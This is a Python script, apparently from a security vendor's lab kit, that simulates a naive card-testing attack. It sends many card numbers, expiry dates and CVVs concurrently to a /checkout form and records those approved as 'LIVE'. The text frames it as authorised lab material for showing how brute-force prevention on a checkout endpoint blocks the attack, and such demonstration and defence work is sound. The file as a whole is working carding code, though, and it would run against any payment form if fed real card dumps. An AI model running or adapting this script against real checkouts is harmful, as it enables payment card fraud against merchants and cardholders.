#!/usr/bin/env python3
"""Tier 1 -- naive carding blast.

Bare POST to /checkout as fast as the box allows: no session, no referrer, no
attempt to look like a browser. This is the crudest form of OAT-001 and the one
every unprotected payment form meets first.

Expected result with no WAF: it works, and finds roughly LIVE_RATE percent of
the dump in seconds.
Expected result with Brute Force Prevention on POST /checkout: outcomes flip to
'blocked' once the Count Window threshold trips.

AUTHORISED LABORATORY USE ONLY. Simulates payment card fraud; run only
against systems you own or have written permission to test. See NOTICE.

Copyright 2026 Barracuda Networks, Inc. Licensed under the Apache License 2.0.
"""

import time
from concurrent.futures import ThreadPoolExecutor

import requests

import labcards


def attempt(session, url, record, timeout):
    response = session.post(
        url,
        data={
            "cardholder": "A Shopper",
            "card_number": record["pan"],
            "exp_month": record["exp_month"],
            "exp_year": record["exp_year"],
            "cvv": record["cvv"],
            "postcode": "SW1A 1AA",
        },
        timeout=timeout,
        allow_redirects=False,
    )
    return labcards.classify(response.status_code, response.text)


def main():
    parser = labcards.base_parser(__doc__.splitlines()[0])
    parser.add_argument("--workers", type=int, default=16, help="concurrent requests")
    args = parser.parse_args()
    labcards.preflight(args)

    dump = labcards.build_dump(args.count, args.secret, args.seed)
    url = args.target.rstrip("/") + "/checkout"
    tally = labcards.Tally()
    started = time.time()

    print(f"tier 1: blasting {args.count} cards at {url} with {args.workers} workers\n")

    def run(record):
        # A fresh session per card: no cookie is ever reused, which is precisely
        # the signal that makes this tier trivial to spot.
        with labcards.new_session(args) as session:
            try:
                outcome = attempt(session, url, record, args.timeout)
            except requests.RequestException as exc:
                outcome = "error"
                print(f"  {record['pan']}  error: {type(exc).__name__}")
        tally.add(outcome, record)
        if outcome == "approved":
            print(f"  {record['pan']}  exp {record['exp_month']}/{record['exp_year']}  "
                  f"cvv {record['cvv']}  LIVE")
        return outcome

    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        list(pool.map(run, dump))

    print(tally.summary(time.time() - started))
    labcards.save_live(args.out, tally.live)


if __name__ == "__main__":
    main()
